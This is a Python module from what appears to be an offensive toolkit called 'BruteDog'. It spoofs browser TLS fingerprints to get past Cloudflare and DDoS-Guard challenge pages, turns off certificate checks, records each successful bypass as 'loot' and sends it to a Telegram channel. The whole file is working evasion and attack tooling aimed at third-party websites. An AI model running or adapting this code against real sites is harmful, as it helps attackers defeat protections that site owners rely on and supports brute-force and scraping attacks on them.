#!/usr/bin/env python3
"""
TLS_EVASION.PY v8.6 — Adversarial TLS Fingerprint Spoofing & WAF Evasion Engine
"""
import asyncio
import hashlib
import logging
import random
import ssl

from modules.loot_logger import save_session_loot
from modules.telegram_notifier import send_telegram_alert
from modules.telemetry import stream_proof

logger = logging.getLogger("BruteDog.TLSEvasion")

try:
    from curl_cffi import requests as cffi_requests

    CFFI_AVAILABLE = True
except ImportError:
    CFFI_AVAILABLE = False

ADVANCED_BROWSER_PROFILES = [
    "chrome120",
    "chrome116",
    "safari17_0",
    "firefox110",
    "edge110",
]

DEFAULT_BROWSER_CIPHERS = (
    "TLS_AES_128_GCM_SHA256:"
    "TLS_AES_256_GCM_SHA384:"
    "TLS_CHACHA20_POLY1305_SHA256:"
    "ECDHE-ECDSA-AES128-GCM-SHA256:"
    "ECDHE-RSA-AES128-GCM-SHA256:"
    "ECDHE-ECDSA-AES256-GCM-SHA384:"
    "ECDHE-RSA-AES256-GCM-SHA384:"
    "ECDHE-ECDSA-CHACHA20-POLY1305:"
    "ECDHE-RSA-CHACHA20-POLY1305:"
    "DHE-RSA-AES128-GCM-SHA256:"
    "DHE-RSA-AES256-GCM-SHA384"
)

CHALLENGE_PAGE_MARKERS = (
    "just a moment...",
    "checking your browser before accessing",
    "attention required! | cloudflare",
    "cf-browser-verification",
    "ddos-guard",
    "__cf_chl_opt",
)

_background_tasks: set[asyncio.Task] = set()


async def broadcast_tg_alert_async(loot_type, details):
    try:
        await asyncio.wait_for(send_telegram_alert(loot_type, details), timeout=8)
    except Exception:
        pass


def broadcast_tg_alert_sync(loot_type, details):
    try:
        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass


def _close_session_quietly(session) -> None:
    if session is None:
        return
    for method_name in ("close", "aclose"):
        fn = getattr(session, method_name, None)
        if callable(fn):
            try:
                res = fn()
                if asyncio.iscoroutine(res):
                    res.close()
            except Exception:
                pass


def _is_challenge_body(text: str) -> bool:
    lower = (text or "").lower()
    return any(marker in lower for marker in CHALLENGE_PAGE_MARKERS)


class AdversarialTLSSession:
    """Manages browser-impersonated TLS sessions and verifies edge WAF pass-through."""

    def __init__(self, target_host: str, browser_profile: str = "chrome120"):
        self.target_host = target_host
        self.browser_profile = browser_profile
        self.evasion_verified = False

    def get_impersonated_session(self, rotate: bool = False):
        """Returns a browser-impersonated session when curl_cffi is installed."""
        if not CFFI_AVAILABLE:
            return None

        profile = random.choice(ADVANCED_BROWSER_PROFILES) if rotate else self.browser_profile
        try:
            session = cffi_requests.Session(impersonate=profile)
            logger.info(f"[+] Armed TLS fingerprint profile: {profile}")
            return session
        except Exception as exc:
            logger.warning(f"[-] Failed to initialize impersonation profile {profile}: {exc}")
            return None

    def verify_waf_bypass(self, test_url: str) -> bool:
        """Probes target URL across browser profiles to check for clean non-challenge responses."""
        if not CFFI_AVAILABLE:
            logger.warning("[-] curl_cffi not installed; WAF active bypass verification skipped.")
            return False

        for profile in ADVANCED_BROWSER_PROFILES:
            session = None
            try:
                session = cffi_requests.Session(impersonate=profile)
                response = session.get(test_url, timeout=8, verify=False)
                response_text = response.text or ""
                headers = {str(k).lower(): v for k, v in (response.headers or {}).items()}

                if response.status_code < 400 and not _is_challenge_body(response_text):
                    self.evasion_verified = True
                    loot_hash = hashlib.sha256(response_text.encode("utf-8", errors="ignore")).hexdigest()

                    evasion_loot = {
                        "target": test_url,
                        "profile": profile,
                        "status_code": response.status_code,
                        "server_header": headers.get("server", "unknown"),
                        "cdn_ray_id": headers.get("cf-ray") or headers.get("x-amz-cf-id", "none"),
                        "integrity_hash": loot_hash,
                    }

                    stream_proof(
                        "WAF_TLS_EVASION_CONFIRMED",
                        test_url,
                        {"profile": profile},
                        response_text[:300],
                        evasion_loot,
                    )

                    save_session_loot(
                        target=test_url,
                        endpoint="tls_evasion",
                        finding_type="WAF_FINGERPRINT_BYPASS_SUCCESS",
                        status=response.status_code,
                        headers=headers,
                        body=response_text,
                        extra_loot=evasion_loot,
                    )

                    broadcast_tg_alert_sync("WAF TLS Evasion Confirmed", evasion_loot)
                    return True
            except Exception as exc:
                logger.debug(f"[-] WAF active probe error with profile {profile}: {exc}")
            finally:
                _close_session_quietly(session)

        return False


def create_spoofed_ssl_context(target_host=None, verify_certs=False):
    """Low-level OpenSSL SSLContext configured with modern TLS bounds and browser ciphers."""
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)

    if not verify_certs:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_3

    try:
        context.set_ciphers(DEFAULT_BROWSER_CIPHERS)
    except ssl.SSLError as exc:
        logger.debug(f"[-] Cipher configuration warning: {exc}")

    context.options |= ssl.OP_NO_COMPRESSION
    return context
